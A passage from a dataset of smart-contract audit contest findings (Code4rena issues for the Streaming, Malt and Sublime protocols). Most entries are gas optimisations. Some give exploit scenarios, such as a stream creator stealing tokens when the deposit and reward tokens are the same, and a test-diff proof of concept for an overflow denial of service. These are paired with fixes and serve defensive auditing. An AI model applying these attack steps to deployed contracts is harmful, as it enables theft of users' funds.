    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nhttps://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L26-L31\n\n```solidity=26\n/// Update pending governor\nfunction setPendingGov(address newPendingGov) governed public {\n    address old = pendingGov;\n    pendingGov = newPendingGov;\n    emit NewPendingGov(old, newPendingGov);\n}\n```\n\n`old` is unnecessary as it's being used only once. Can be changed to:\n\n\n```solidity=26\n/// Update pending governor\nfunction setPendingGov(address newPendingGov) governed public {\n    emit NewPendingGov(pendingGov, newPendingGov);\n    pendingGov = newPendingGov;\n}\n```\n\n\n\nhttps://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L237-L238\n\n```solidity=237\nuint256 globalStreamingSpeedPerSecond = (uint256(unstreamed) * 10**6)/ (endStream - lastUpdate);\nunstreamed -= uint112((uint256(tdelta) * globalStreamingSpeedPerSecond) / 10**6);\n```\n\nCan be changed to:\n\n```solidity=237\nunstreamed -= uint112((uint256(tdelta) * (uint256(unstreamed) * 10**6)/ (endStream - lastUpdate)) / 10**6);\n```\n\n\n\nhttps://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L417-L447\n```solidity=417\nfunction stake(uint112 amount) public lock updateStream(msg.sender) {\n    require(amount > 0, \"amt\");\n\n    // checked in updateStream\n    // require(block.timestamp < endStream, \"stake:!stream\");\n\n    // transfer tokens over\n    uint256 prevBal = ERC20(depositToken).balanceOf(address(this));\n    ERC20(depositToken).safeTransferFrom(msg.sender, address(this), amount);\n    uint256 newBal = ERC20(depositToken).balanceOf(address(this));\n    require(newBal <= type(uint112).max && newBal > prevBal, \"erc\");\n    \n    uint112 trueDepositAmt = uint112(newBal - prevBal);\n\n    depositTokenAmount += trueDepositAmt;\n    TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n    ts.tokens += trueDepositAmt;\n\n    uint256 virtualBal = dilutedBalance(trueDepositAmt);\n    ts.virtualBalance += virtualBal;\n    totalVirtualBalance += virtualBal;\n    unstreamed += trueDepositAmt;\n\n    if (!isSale) {\n        // not a straight sale, so give the user some receipt tokens\n        _mint(msg.sender, trueDepositAmt);\n    } else {\n    }\n\n    emit Staked(msg.sender, trueDepositAmt);\n}\n```\n`trueDepositAmt` can be replaced with `amount`.\n\n\n\nhttps://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L500-L511\n\n```solidity=500\nfunction createIncentive(address token, uint112 amount) public lock {\n    require(token != rewardToken && token != depositToken, \"inc\");\n    \n    uint256 prevBal = ERC20(token).balanceOf(address(this));\n    ERC20(token).safeTransferFrom(msg.sender, address(this), amount);\n    uint256 newBal = ERC20(token).balanceOf(address(this));\n    require(newBal <= type(uint112).max && newBal > prevBal, \"erc\");\n\n    uint112 amt = uint112(newBal - prevBal);\n    incentives[token] += amt;\n    emit StreamIncentivized(token, amt);\n}\n```\n\n`amt` can be replaced with `amount`.\n\n\n\n\nhttps://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L743-L743\n\n```solidity=743\n(bool success, bytes memory _ret) = who.call(data);\n```\n\nCan be changed to:\n\n```solidity=743\n(bool success, ) = who.call(data);\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-streaming-findings",
      "repo": "https://github.com/code-423n4/2021-11-streaming-findings",
      "url": "https://github.com/code-423n4/2021-11-streaming-findings/issues/233"
    }
  },
  {
    "title": "Use immutable variables can save gas",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nhttps://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/LockeERC20.sol#L21-L23\n\n```solidity=21\nstring public name;\n\nstring public symbol;\n```\n\n`name` and `symbol` will never change, use immutable variable instead of storage variable can save gas.\n\nOther examples include:\n\nhttps://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L72-L72\n\n```solidity=72\nIGoverned public gov;\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-streaming-findings",
      "repo": "https://github.com/code-423n4/2021-11-streaming-findings",
      "url": "https://github.com/code-423n4/2021-11-streaming-findings/issues/231"
    }
  },
  {
    "title": "DOS while dealing with erc20 when value(i.e amount*decimals)  is high but less than type(uint112).max",
    "severity": "major",
    "body": "# Handle\r\n\r\nhack3r-0m\r\n\r\n\r\n# Vulnerability details\r\n\r\n## Impact\r\n\r\nhttps://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L229\r\n\r\nreverts due to overflow for higher values (but strictly less than type(uint112).max) and hence when user calls `exit` or `withdraw` function it will revert and that user will not able to withdraw funds permanentaly.\r\n\r\n## Proof of Concept\r\n\r\nAttaching diff to modify tests to reproduce behaviour:\r\n\r\n```\r\ndiff --git a/Streaming/src/test/Locke.t.sol b/Streaming/src/test/Locke.t.sol\r\nindex 2be8db0..aba19ce 100644\r\n--- a/Streaming/src/test/Locke.t.sol\r\n+++ b/Streaming/src/test/Locke.t.sol\r\n@@ -166,14 +166,14 @@ contract StreamTest is LockeTest {\r\n         );\r\n \r\n         testTokenA.approve(address(stream), type(uint256).max);\r\n-        stream.fundStream((10**14)*10**18);\r\n+        stream.fundStream(1000);\r\n \r\n-        alice.doStake(stream, address(testTokenB), (10**13)*10**18);\r\n+        alice.doStake(stream, address(testTokenB), 100);\r\n \r\n \r\n         hevm.warp(startTime + minStreamDuration / 2); // move to half done\r\n         \r\n-        bob.doStake(stream, address(testTokenB), (10**13)*10**18);\r\n+        bob.doStake(stream, address(testTokenB), 100);\r\n \r\n         hevm.warp(startTime + minStreamDuration / 2 + minStreamDuration / 10);\r\n \r\n@@ -182,10 +182,10 @@ contract StreamTest is LockeTest {\r\n         hevm.warp(startTime + minStreamDuration + 1); // warp to end of stream\r\n \r\n \r\n-        // alice.doClaimReward(stream);\r\n-        // assertEq(testTokenA.balanceOf(address(alice)), 533*(10**15));\r\n-        // bob.doClaimReward(stream);\r\n-        // assertEq(testTokenA.balanceOf(address(bob)), 466*(10**15));\r\n+        alice.doClaimReward(stream);\r\n+        assertEq(testTokenA.balanceOf(address(alice)), 533);\r\n+        bob.doClaimReward(stream);\r\n+        assertEq(testTokenA.balanceOf(address(bob)), 466);\r\n     }\r\n \r\n     function test_stake() public {\r\ndiff --git a/Streaming/src/test/utils/LockeTest.sol b/Streaming/src/test/utils/LockeTest.sol\r\nindex eb38060..a479875 100644\r\n--- a/Streaming/src/test/utils/LockeTest.sol\r\n+++ b/Streaming/src/test/utils/LockeTest.sol\r\n@@ -90,11 +90,11 @@ abstract contract LockeTest is TestHelpers {\r\n         testTokenA = ERC20(address(new TestToken(\"Test Token A\", \"TTA\", 18)));\r\n         testTokenB = ERC20(address(new TestToken(\"Test Token B\", \"TTB\", 18)));\r\n         testTokenC = ERC20(address(new TestToken(\"Test Token C\", \"TTC\", 18)));\r\n-        write_balanceOf_ts(address(testTokenA), address(this), (10**14)*10**18);\r\n-        write_balanceOf_ts(address(testTokenB), address(this), (10**14)*10**18);\r\n-        write_balanceOf_ts(address(testTokenC), address(this), (10**14)*10**18);\r\n-        assertEq(testTokenA.balanceOf(address(this)), (10**14)*10**18);\r\n-        assertEq(testTokenB.balanceOf(address(this)), (10**14)*10**18);\r\n+        write_balanceOf_ts(address(testTokenA), address(this), 100*10**18);\r\n+        write_balanceOf_ts(address(testTokenB), address(this), 100*10**18);\r\n+        write_balanceOf_ts(address(testTokenC), address(this), 100*10**18);\r\n+        assertEq(testTokenA.balanceOf(address(this)), 100*10**18);\r\n+        assertEq(testTokenB.balanceOf(address(this)), 100*10**18);\r\n \r\n         defaultStreamFactory = new StreamFactory(address(this), address(this));\r\n \r\n```\r\n\r\n## Tools Used\r\n\r\nManual Review\r\n\r\n## Recommended Mitigation Steps\r\n\r\nConsider doing arithmetic operations in two steps or upcasting to u256 and then downcasting. Alternatively, find a threshold where it breaks and add require condition to not allow total stake per user greater than threshhold.\r\n\r\n",
    "dataSource": {
      "name": "code-423n4/2021-11-streaming-findings",
      "repo": "https://github.com/code-423n4/2021-11-streaming-findings",
      "url": "https://github.com/code-423n4/2021-11-streaming-findings/issues/228"
    }
  },
  {
    "title": "Tokens can be stolen when `depositToken == rewardToken`",
    "severity": "major",
    "body": "# Handle\n\ncmichel\n\n\n# Vulnerability details\n\nThe `Streaming` contract allows the `deposit` and `reward` tokens to be the same token.\n\n> I believe this is intended, think Sushi reward on Sushi as is the case with `xSushi`.\n\nThe reward and deposit balances are also correctly tracked independently in `depositTokenAmount` and `rewardTokenAmount`.\nHowever, when recovering tokens this leads to issues as the token is recovered twice, once for deposits and another time for rewards:\n\n```solidity\nfunction recoverTokens(address token, address recipient) public lock {\n    // NOTE: it is the stream creators responsibility to save\n    // tokens on behalf of their users.\n    require(msg.sender == streamCreator, \"!creator\");\n    if (token == depositToken) {\n        require(block.timestamp > endDepositLock, \"time\");\n        // get the balance of this contract\n        // check what isnt claimable by either party\n        // @audit-info depositTokenAmount updated on stake/withdraw/exit, redeemedDepositTokens increased on claimDepositTokens\n        uint256 excess = ERC20(token).balanceOf(address(this)) - (depositTokenAmount - redeemedDepositTokens);\n        // allow saving of the token\n        ERC20(token).safeTransfer(recipient, excess);\n\n        emit RecoveredTokens(token, recipient, excess);\n        return;\n    }\n    \n    if (token == rewardToken) {\n        require(block.timestamp > endRewardLock, \"time\");\n        // check current balance vs internal balance\n        //\n        // NOTE: if a token rebases, i.e. changes balance out from under us,\n        // most of this contract breaks and rugs depositors. this isn't exclusive\n        // to this function but this function would in theory allow someone to rug\n        // and recover the excess (if it is worth anything)\n\n        // check what isnt claimable by depositors and governance\n        // @audit-info rewardTokenAmount increased on fundStream\n        uint256 excess = ERC20(token).balanceOf(address(this)) - (rewardTokenAmount + rewardTokenFeeAmount);\n        ERC20(token).safeTransfer(recipient, excess);\n\n        emit RecoveredTokens(token, recipient, excess);\n        return;\n    }\n    // ...\n```\n\n#### POC\nGiven `recoverTokens == depositToken`, `Stream` creator calls `recoverTokens(token = depositToken, creator)`.\n\n- The `token` balance is the sum of deposited tokens (minus reclaimed) plus the reward token amount. `ERC20(token).balanceOf(address(this)) >= (depositTokenAmount - redeemedDepositTokens) + (rewardTokenAmount + rewardTokenFeeAmount)`\n- `if (token == depositToken)` executes, the `excess` from the deposit amount will be the reward amount (`excess >= rewardTokenAmount + rewardTokenFeeAmount`). This will be transferred.\n- `if (token == rewardToken)` executes, the new token balance is just the deposit token amount now (because the reward token amount has been transferred out in the step before). Therefore, `ERC20(token).balanceOf(address(this)) >= depositTokenAmount - redeemedDepositTokens`. If this is non-negative, the transaction does not revert and the creator makes a profit.\n\nExample:\n- outstanding redeemable deposit token amount: `depositTokenAmount - redeemedDepositTokens = 1000`\n- funded `rewardTokenAmount` (plus `rewardTokenFeeAmount` fees): `rewardTokenAmount + rewardTokenFeeAmount = 500`\n\nCreator receives `1500 - 1000 = 500` excess deposit and `1000 - 500 = 500` excess reward.\n\n## Impact\nWhen using the same deposit and reward token, the stream creator can steal tokens from the users who will be unable to withdraw their profit or claim their rewards.\n\n## Recommended Mitigation Steps\nOne needs to be careful with using `.balanceOf` in this special case as it includes both deposit and reward balances.\n\nAdd a special case for `recoverTokens` when `token == depositToken == rewardToken` and then the excess should be `ERC20(token).balanceOf(address(this)) - (depositTokenAmount - redeemedDepositTokens) - (rewardTokenAmount + rewardTokenFeeAmount);`\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-streaming-findings",
      "repo": "https://github.com/code-423n4/2021-11-streaming-findings",
      "url": "https://github.com/code-423n4/2021-11-streaming-findings/issues/215"
    }
  },
  {
    "title": "ERC20 import",
    "body": "# Handle\n\npauliax\n\n\n# Vulnerability details\n\n## Impact\nYou don't need to import the implementation to interact with the contract, you can import only an interface, e.g. here:\n```solidity\n ERC20 public collateralToken;\n```\nConsider replacing ERC20 with IERC20 to reduce deployment costs.\n\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-malt-findings",
      "repo": "https://github.com/code-423n4/2021-11-malt-findings",
      "url": "https://github.com/code-423n4/2021-11-malt-findings/issues/364"
    }
  },
  {
    "title": "DOMAIN_SEPARATOR can change",
    "severity": "minor",
    "body": "# Handle\n\npauliax\n\n\n# Vulnerability details\n\n## Impact\nThe variable DOMAIN_SEPARATOR in contract ERC20Permit is assigned in the constructor and will not change after being initialized. However, if a hard fork happens after the contract deployment, the domain would become invalid on one of the forked chains due to the block.chainid has changed. \nAlso, you don't need an assmebly to retrieve chainid, you can get it from a built in variable block.chainid.\n\nSimilar issues were reported in a previous contest and were assigned a severity of low: \nhttps://github.com/code-423n4/2021-06-realitycards-findings/issues/166 \nhttps://github.com/code-423n4/2021-09-swivel-findings/issues/98\n\n## Recommended Mitigation Steps\nAn elegant solution that you may consider applying is from Sushi Trident: https://github.com/sushiswap/trident/blob/concentrated/contracts/pool/concentrated/TridentNFT.sol#L47-L62\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-malt-findings",
      "repo": "https://github.com/code-423n4/2021-11-malt-findings",
      "url": "https://github.com/code-423n4/2021-11-malt-findings/issues/349"
    }
  },
  {
    "title": "Ether can be locked in the `PoolFactory` contract without a way to retrieve it",
    "severity": "medium",
    "body": "# Handle\n\nbroccolirob\n\n\n# Vulnerability details\n\nIf a borrower calls the `createPool` function with a non-zero value, but also includes an ERC20 token address for `_collateralToken`, then the Ether value sent will be locked in the `PoolFactory` contract forever.\n- [createPool L260-317](https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/Pool/PoolFactory.sol#L260-L317)\n\nIn the `_createPool` function, a `_collateralToken` address other than the zero address will set the `amount` variable to zero. That `amount` variable will be passed to `create2` which will send 0 wei to the newly created `Pool` contract.\n```solidity\n// _createPool L349\nuint256 amount = _collateralToken == address(0) ? _collateralAmount : 0;\n```\n\n## Impact\nA borrower can accidentally lock Ether in the `PoolFactory` without the ability to retrieve it.\n\n## Proof of Concept\nA borrower reuses a script they made to create a pool and deposit collateral. They intend to deposit Ether as collateral so they send value with the transaction, but forget to change the `_collateralToken` address to address(0). The `Pool` contract will be deployed using the `_collateralToken`, and will lock the Ether sent in the `PoolFactory`\n\n## Tools Used\nManual analysis and Hardhat.\n\n## Recommended Mitigation Steps\nIf msg.value is greater than 0, make sure the `_collateralToken` address is set to address(0).\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-sublime-findings",
      "repo": "https://github.com/code-423n4/2021-12-sublime-findings",
      "url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/168"
    }
  },
  {
    "title": "Gas: Use `else if` in `withdrawLiquidity`",
    "body": "# Handle\n\ncmichel\n\n\n# Vulnerability details\n\nThe `if` conditions in `Pool.withdrawLiquidity` are distinct conditions on the pool status.\nTherefore, `else if` is semantically equivalent but more gas efficient.\n\n```solidity\nif (_loanStatus == LoanStatus.DEFAULTED || _loanStatus == LoanStatus.TERMINATED) {\n    uint256 _totalAsset;\n    if (poolConstants.borrowAsset != address(0)) {\n        _totalAsset = IERC20(poolConstants.borrowAsset).balanceOf(address(this));\n    } else {\n        _totalAsset = address(this).balance;\n    }\n    //assuming their will be no tokens in pool in any case except liquidation (to be checked) or we should store the amount in liquidate()\n    _toTransfer = _toTransfer.mul(_totalAsset).div(totalSupply());\n}\n// @audit gas: use else if, status fields are distinct, only one of the branches is (if ever) executed anyway\nif (_loanStatus == LoanStatus.CANCELLED) {\n    _toTransfer = _toTransfer.add(_toTransfer.mul(poolVariables.penaltyLiquidityAmount).div(totalSupply()));\n}\n\nif (_loanStatus == LoanStatus.CLOSED) {\n    //transfer repayment\n    _withdrawRepayment(msg.sender);\n}\n```\n\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-sublime-findings",
      "repo": "https://github.com/code-423n4/2021-12-sublime-findings",
      "url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/148"
    }
  },
  {
    "title": "Collateral deposit does not support fee-on-transfer tokens",
    "severity": "minor",
    "body": "# Handle\n\ncmichel\n\n\n# Vulnerability details\n\nCertain ERC20 tokens make modifications to their ERC20's `transfer` or `balanceOf` functions.\nOne type of these tokens is deflationary tokens that charge a certain fee for every `transfer()` or `transferFrom()`.\n\nThe `CreditLine._depositCollateral` function does _not_ work well with fee-on-transfer tokens. An `_amount` is first transferred to this address and then a strategy is approved with the same amount.\nHowever, when the strategy tries to transfer this `_amount` from the pool, it will fail as the pool received less than `_amount` due to the fee.\n\n## Recommended Mitigation Steps\nOne possible mitigation is to measure the asset change right before and after the asset-transferring calls.\n\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-sublime-findings",
      "repo": "https://github.com/code-423n4/2021-12-sublime-findings",
      "url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/143"
    }
  },
  {
    "title": "`NoYield.sol` Tokens with fee on transfer are not supported",
    "severity": "medium",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nThere are ERC20 tokens that charge fee for every `transfer()` or `transferFrom()`.\n\nIn the current implementation, `NoYield.sol#lockTokens()` assumes that the received amount is the same as the transfer amount, and uses it to calculate `sharesReceived` amounts.\n\nAs a result, in `unlockTokens()`, later users may not be able to successfully withdraw their tokens, as it may revert at L141 for insufficient balance.\n\nhttps://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/yield/NoYield.sol#L93-L106\n\n```solidity\n    function lockTokens(\n        address user,\n        address asset,\n        uint256 amount\n    ) external payable override onlySavingsAccount nonReentrant returns (uint256 sharesReceived) {\n        require(amount != 0, 'Invest: amount');\n        if (asset != address(0)) {\n            IERC20(asset).safeTransferFrom(user, address(this), amount);\n        } else {\n            require(msg.value == amount, 'Invest: ETH amount');\n        }\n        sharesReceived = amount;\n        emit LockedTokens(user, asset, sharesReceived);\n    }\n```\n\nhttps://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/yield/NoYield.sol#L134-L144\n\n```solidity\n    function _unlockTokens(address asset, uint256 amount) internal returns (uint256 received) {\n        require(amount != 0, 'Invest: amount');\n        received = amount;\n        if (asset == address(0)) {\n            (bool success, ) = savingsAccount.call{value: received}('');\n            require(success, 'Transfer failed');\n        } else {\n            IERC20(asset).safeTransfer(savingsAccount, received);\n        }\n        emit UnlockedTokens(asset, received);\n    }\n```\n\n### Recommendation\n\nConsider comparing before and after balance to get the actual transferred amount.\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-sublime-findings",
      "repo": "https://github.com/code-423n4/2021-12-sublime-findings",
      "url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/142"
    }
  },
  {
    "title": "Aave's share tokens are rebasing breaking current strategy code",
    "severity": "major",
    "body": "# Handle\n\ncmichel\n\n\n# Vulnerability details\n\nWhen depositing into Aave through the `AaveYield.lockTokens` contract strategy, one receives the `sharesReceived` amount corresponding to the diff of `aToken` balance, which is just always the deposited amount as aave is a rebasing token and `1.0 aToken = 1.0 underlying` at each deposit / withdrawal.\n\nNote that this `sharesReceived` (the underlying deposit amount) is cached in a `balanceInShares` map in `SavingsAccount.deposit` which makes this share _static_ and not dynamically rebasing anymore:\n\n```solidity\nfunction deposit(\n    uint256 _amount,\n    address _token,\n    address _strategy,\n    address _to\n) external payable override nonReentrant returns (uint256) {\n    require(_to != address(0), 'SavingsAccount::deposit receiver address should not be zero address');\n    uint256 _sharesReceived = _deposit(_amount, _token, _strategy);\n    balanceInShares[_to][_token][_strategy] = balanceInShares[_to][_token][_strategy].add(_sharesReceived);\n    emit Deposited(_to, _sharesReceived, _token, _strategy);\n    return _sharesReceived;\n}\n\nfunction getTokensForShares(uint256 shares, address asset) public view override returns (uint256 amount) {\n    if (shares == 0) return 0;\n    address aToken = liquidityToken(asset);\n\n    (, , , , , , , uint256 liquidityIndex, , ) = IProtocolDataProvider(protocolDataProvider).getReserveData(asset);\n\n    // @audit-info tries to do (user shares / total shares) * underlying amount where underlying amount = scaledBalance * liquidityIndex\n    amount = IScaledBalanceToken(aToken).scaledBalanceOf(address(this)).mul(liquidityIndex).mul(shares).div(\n        IERC20(aToken).balanceOf(address(this))\n    );\n}\n```\n\nHowever, the `getTokensForShares` function uses a rebasing total share supply of `IERC20(aToken).balanceOf(this)`.\n\n#### POC\n- SavingsAccount deposits 1000 DAI for user and user receives 1000 aDAI as shares. These shares are cached in `balanceInShares[user][dai][aave]`.\n- Time passes, Aave accrues interest for lenders, and the initial 1000 aTokens balance has rebased to 1200 aTokens\n- SavingsAccount `withdraw`s 1000 aDAI shares for user which calls `AaveYield.unlockTokens`. The user receives only 1000 DAI. The interest owed to the user is not paid out.\n- Note that `getTokensForShares` also returns the wrong amount as `1200 * 1000 / 1200 = 1000`\n\n## Impact\nInterest is not paid out to users.\nPool collateral is measured without the interest accrued as it uses `getTokensForShares` which will lead to early liquidations and further loss.\n\n## Recommended Mitigation Steps\nIf the user shares are not rebasing, you cannot have the \"total shares supply\" (the shares in the contract) be rebasing as in `getTokensForShares`. Also withdrawing the share amount directly from Aave as in `_withdrawERC` does not withdraw the yield.\nA fix could be to create a _non-rebasing_ wrapper LP token that is paid out to the user proportional to the current strategy TVL at time of user deposit.\n\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-sublime-findings",
      "repo": "https://github.com/code-423n4/2021-12-sublime-findings",
      "url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/137"
    }
  },
  {
    "title": "approve return values not checked",
    "body": "# Handle\n\ncmichel\n\n\n# Vulnerability details\n\nThe strategies use `approve` but don't check the return value, see for example `AaveYield._depositERC20`:\n\n```solidity\nfunction _depositERC20(address asset, uint256 amount) internal returns (address aToken, uint256 sharesReceived) {\n  aToken = liquidityToken(asset);\n  uint256 aTokensBefore = IERC20(aToken).balanceOf(address(this));\n\n  address lendingPool = ILendingPoolAddressesProvider(lendingPoolAddressesProvider).getLendingPool();\n\n  //approve collateral to vault\n  // @audit should check ret value\n  IERC20(asset).approve(lendingPool, 0);\n  IERC20(asset).approve(lendingPool, amount);\n\n  //lock collateral in vault\n  AaveLendingPool(lendingPool).deposit(asset, amount, address(this), referralCode);\n\n  sharesReceived = IERC20(aToken).balanceOf(address(this)).sub(aTokensBefore);\n}\n```\n\nThe `ERC20.approve()` function returns a boolean value indicating success. This parameter needs to be checked for success.\nSome tokens do **not** revert if the transfer failed but return `false` instead.\n\n## Impact\nTokens that don't actually perform the approval and return `false` are still counted as a correct transfer.\n\n## Recommended Mitigation Steps\nWe recommend using [OpenZeppelin’s `SafeERC20`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.1/contracts/token/ERC20/utils/SafeERC20.sol#L74) versions with the `safeApprove` function that handles the return value check as well as non-standard-compliant tokens.\n\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-sublime-findings",
      "repo": "https://github.com/code-423n4/2021-12-sublime-findings",
      "url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/136"
    }
  },
  {
    "title": "`AaveYield.getTokensForShares()`, `AaveYield.getSharesForTokens()` Implementation can be simpler and save some gas",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nBased on the current implementation, shares are in aToken, which is 1:1 to the underlying token.\n\nTherefore, `getTokensForShares()` and `getSharesForTokens()` can be much simplier.\n\nhttps://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/yield/AaveYield.sol#L256-L265\n\n```solidity\n    function getTokensForShares(uint256 shares, address asset) public view override returns (uint256 amount) {\n        if (shares == 0) return 0;\n        address aToken = liquidityToken(asset);\n\n        (, , , , , , , uint256 liquidityIndex, , ) = IProtocolDataProvider(protocolDataProvider).getReserveData(asset);\n\n        amount = IScaledBalanceToken(aToken).scaledBalanceOf(address(this)).mul(liquidityIndex).mul(shares).div(\n            IERC20(aToken).balanceOf(address(this))\n        );\n    }\n```\n\ncan be changed to:\n\n```solidity\n    function getTokensForShares(uint256 shares, address asset) public view override returns (uint256) {\n        return shares;\n    }\n```\n\nhttps://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/yield/AaveYield.sol#L273-L275\n\n```solidity\n    function getSharesForTokens(uint256 amount, address asset) external view override returns (uint256 shares) {\n        shares = (amount.mul(1e18)).div(getTokensForShares(1e18, asset));\n    }\n```\n\ncan be changed to:\n\n```solidity\n    function getSharesForTokens(uint256 amount, address asset) external view override returns (uint256) {\n        return amount;\n    }\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-sublime-findings",
      "repo": "https://github.com/code-423n4/2021-12-sublime-findings",
      "url": "https://github.com/code-423n4/2021-12-sublime-findings/issues/128"
    }
  },
  {
    "title": "Inline unnecessary function can make the code simpler and save some gas",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nhttps://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/CreditLine/CreditLine.sol#L466-L472\n\n```solidity\n  function updateinterestAccruedTillLastPrincipalUpdate(uint256 _id) internal {\n      require(creditLineVariables[_id].status == CreditLineStatus.ACTIVE, 'CreditLine: The credit line is not yet active.');\n\n      uint256 _interestAccrued = calculateInterestAccrued(_id);\n      uint256 _newInterestAccrued = (creditLineVariables[_id].interestAccruedTillLastPrincipalUpdate).add(_interestAccrued);\n      creditLineVariables[_id].interestAccruedTillLastPrincipalUpdate = _newInterestAccrued;\n  }\n```\n\nhttps://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/CreditLine/CreditLine.sol#L691-L727\n\n```solidity\n    function borrow(uint256 _id, uint256 _amount) external payable nonReentrant onlyCreditLineBorrower(_id) {\n        require(creditLineVariables[_id].status == CreditLineStatus.ACTIVE, 'CreditLine: The credit line is not yet active.');\n        uint256 _borrowableAmount = calculateBorrowableAmount(_id);\n        require(_amount <= _borrowableAmount, \"CreditLine::borrow - The current collateral ratio doesn't allow to withdraw the amount\");\n        address _borrowAsset = creditLineConstants[_id].borrowAsset;\n        address _lender = creditLineConstants[_id].lender;\n\n        updateinterestAccruedTillLastPrincipalUpdate(_id);\n        creditLineVariables[_id].principal = creditLineVariables[_id].principal.add(_amount);\n        creditLineVariables[_id].lastPrincipalUpdateTime = block.timestamp;\n\n        uint256 _tokenDiffBalance;\n        if (_borrowAsset != address(0)) {\n            uint256 _balanceBefore = IERC20(_borrowAsset).balanceOf(address(this));\n            _withdrawBorrowAmount(_borrowAsset, _amount, _lender);\n            uint256 _balanceAfter = IERC20(_borrowAsset).balanceOf(address(this));\n            _tokenDiffBalance = _balanceAfter.sub(_balanceBefore);\n        } else {\n            uint256 _balanceBefore = address(this).balance;\n            _withdrawBorrowAmount(_borrowAsset, _amount, _lender);\n            uint256 _balanceAfter = address(this).balance;\n            _tokenDiffBalance = _balanceAfter.sub(_balanceBefore);\n        }\n        uint256 _protocolFee = _tokenDiffBalance.mul(protocolFeeFraction).div(10**30);\n        _tokenDiffBalance = _tokenDiffBalance.sub(_protocolFee);\n\n        if (_borrowAsset == address(0)) {\n            (bool feeSuccess, ) = protocolFeeCollector.call{value: _protocolFee}('');\n            require(feeSuccess, 'Transfer fail');\n            (bool success, ) = msg.sender.call{value: _tokenDiffBalance}('');\n            require(success, 'Transfer fail');\n        } else {\n            IERC20(_borrowAsset).safeTransfer(protocolFeeCollector, _protocolFee);\n            IERC20(_borrowAsset).safeTransfer(msg.sender, _tokenDiffBalance);\n        }\n        emit BorrowedFromCreditLine(_id, _tokenDiffBalance);\n    }\n```\n\n\n`updateinterestAccruedTillLastPrincipalUpdate()` is unnecessary as it's being used only once. Therefore it can be inlined in `borrow()` to make the code simpler and save gas.\n\n### Recommendation\n\nChange to:\n\n```solidity\n  function borrow(uint256 _id, uint256 _amount) external payable nonReentrant onlyCreditLineBorrower(_id) {\n      require(creditLineVariables[_id].status == CreditLineStatus.ACTIVE, 'CreditLine: The credit line is not yet active.');\n      uint256 _borrowableAmount = calculateBorrowableAmount(_id);\n      require(_amount <= _borrowableAmount, \"CreditLine::borrow - The current collateral ratio doesn't allow to withdraw the amount\");\n      address _borrowAsset = creditLineConstants[_id].borrowAsset;\n      address _lender = creditLineConstants[_id].lender;\n\n      creditLineVariables[_id].interestAccruedTillLastPrincipalUpdate = (creditLineVariables[_id].interestAccruedTillLastPrincipalUpdate).add(calculateInterestAccrued(_id));\n      creditLineVariables[_id].principal = creditLineVariables[_id].principal.add(_amount);\n      creditLineVariables[_id].lastPrincipalUpdateTime = block.timestamp;\n\n      uint256 _tokenDiffBalance;\n      if (_borrowAsset != address(0)) {\n          uint256 _balanceBefore = IERC20(_borrowAsset).balanceOf(address(this));\n          _withdrawBorrowAmount(_borrowAsset, _amount, _lender);\n          uint256 _balanceAfter = IERC20(_borrowAsset).balanceOf(address(this));\n          _tokenDiffBalance = _balanceAfter.sub(_balanceBefore);\n      } else {\n          uint256 _balanceBefore = address(this).balance;\n          _withdrawBorrowAmount(_borrowAsset, _amount, _lender);\n          uint256 _balanceAfter = address(this).balance;\n          _tokenDiffBalance = _balanceAfter.sub(_balanceBefore);\n      }\n      uint256 _protocolFee = _tokenDiffBalance.mul(protocolFeeFraction).div(10**30);\n      _tokenDiffBalance = _tokenDiffBalance.sub(_protocolFee);\n\n      if (_borrowAsset == address(0)) {\n          (bool feeSuccess, ) = protocolFeeCollector.call{value: _protocolFee}('');\n          require(feeSuccess, 'Transfer fail');\n          (bool success, ) = 